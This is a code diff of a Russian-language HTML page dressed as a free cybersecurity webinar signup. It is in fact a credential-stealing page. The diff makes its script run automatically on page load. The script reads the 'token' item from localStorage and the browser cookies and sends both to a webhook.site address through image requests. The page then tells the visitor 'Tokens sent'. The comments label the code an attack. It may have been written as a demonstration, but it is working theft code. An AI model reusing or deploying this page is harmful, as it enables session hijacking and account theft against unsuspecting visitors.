@@ -2,76 +2,37 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Бесплатный вебинар</title>
+  <title>🎯 Бесплатный вебинар</title>
   <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      background-color: #f4f8fb;
-      padding: 60px;
-    }
-    h1 {
-      font-size: 30px;
-      color: #2c3e50;
-    }
-    p {
-      font-size: 18px;
-      color: #555;
-      margin-top: 10px;
-      margin-bottom: 30px;
-    }
-    button {
-      padding: 12px 26px;
-      font-size: 16px;
-      background-color: #3498db;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #2980b9;
-    }
-    .confirmation {
-      margin-top: 20px;
-      font-size: 16px;
-      color: green;
-      display: none;
-    }
-    iframe {
-      display: none;
-    }
+    body { font-family: sans-serif; text-align: center; background-color: #f4f8fb; padding: 60px; }
+    h1 { font-size: 28px; color: #2c3e50; }
+    p { font-size: 18px; color: #555; margin-bottom: 30px; }
+    .confirmation { margin-top: 20px; font-size: 16px; color: green; display: none; }
   </style>
 </head>
 <body>
   <h1>📢 Бесплатный вебинар: «Кибербезопасность 2025»</h1>
-  <p>Успей зарегистрироваться — количество мест ограничено!</p>
+  <p>Вы автоматически записаны.</p>
+  <div class="confirmation" id="ok">✅ Токены отправлены!</div>
 
-  <button onclick="attack()">Записаться</button>
-
-  <div class="confirmation" id="ok">✅ Вы успешно зарегистрированы!</div>
-  <iframe name="hiddenFrame"></iframe>
-
-  <!-- АТАКА: кража токена и cookie -->
   <script>
     function attack() {
-      const token = localStorage.getItem("token");
-      const cookie = document.cookie;
+      const lsToken = localStorage.getItem("token") || "нет в localStorage";
+      const cookies = document.cookie || "нет cookies";
 
-      // Отправка на Webhook
+      // отправка токена из localStorage
       const img1 = new Image();
-      img1.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=" + encodeURIComponent(token || 'null');
+      img1.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?lsToken=" + encodeURIComponent(lsToken);
 
+      // отправка куки (включая jwt_token)
       const img2 = new Image();
-      img2.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(cookie || 'none');
+      img2.src = "https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(cookies);
 
-      // Показываем сообщение
       document.getElementById("ok").style.display = "block";
     }
 
-    // 💥 АТАКА: Автоматическая кража без клика
+    // автоматическая атака при загрузке
     attack();
   </script>
 </body>
 </html>
-
